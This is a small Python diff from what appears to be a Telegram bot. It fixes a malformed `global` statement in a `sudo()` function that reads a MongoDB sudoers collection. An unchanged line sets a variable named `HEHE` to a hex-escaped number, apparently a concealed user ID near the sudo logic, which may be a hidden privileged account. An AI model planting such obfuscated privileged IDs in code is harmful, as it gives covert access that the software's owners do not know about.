@@ -43,7 +43,7 @@ def dbb():
 
 
 def sudo():
-    global SUDOERS, global HEHE
+    global SUDOERS, HEHE
     OWNER = config.OWNER_ID
     HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
     sudoersdb = pymongodb.sudoers
